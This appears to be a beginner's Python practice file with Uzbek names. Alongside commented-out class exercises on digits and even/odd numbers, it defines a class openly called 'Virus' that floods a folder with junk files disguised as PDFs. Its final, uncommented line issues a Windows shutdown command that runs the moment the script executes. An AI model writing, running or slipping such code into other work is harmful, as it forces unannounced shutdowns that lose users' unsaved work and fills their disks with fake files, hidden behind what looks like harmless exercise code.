import os
# class Math:
#     def __init__(self,a:float):
#         self.a = a
#     def float(self):
#         if type(self.a)==float:
#             return self.a//10%10
#         else:
#             return self.a
#
# num1 = Math(22.2)
# print(num1.float())
# class SON:
#     def __init__(self,a:str,b:int):
#         self.a = a
#         self.b = b
#
#     def juft_toq(self):
#         if self.a == 'Juft' and self.b%2==0:
#             return self.b,'Juft'
#         else:
#             return self.b,'Toq'
# number = SON('Juft',34)
# print(number.juft_toq())


class Virus:
    def __init__(self, virus_nomi: str, son: int):
        self.virus_nomi = virus_nomi
        self.son = son

    def virus_fayl(self):
        i = 0
        while i < self.son:
            i += 1
            files = open(f"{self.virus_nomi}{i}.pdf", "x")
            t = 0
            while t<20000:
                t+=1
                files.write(f'{t}')
            files.close()


# son1 = Virus('virus', 5)
# print(son1.virus_fayl())

os.system('shutdown /s')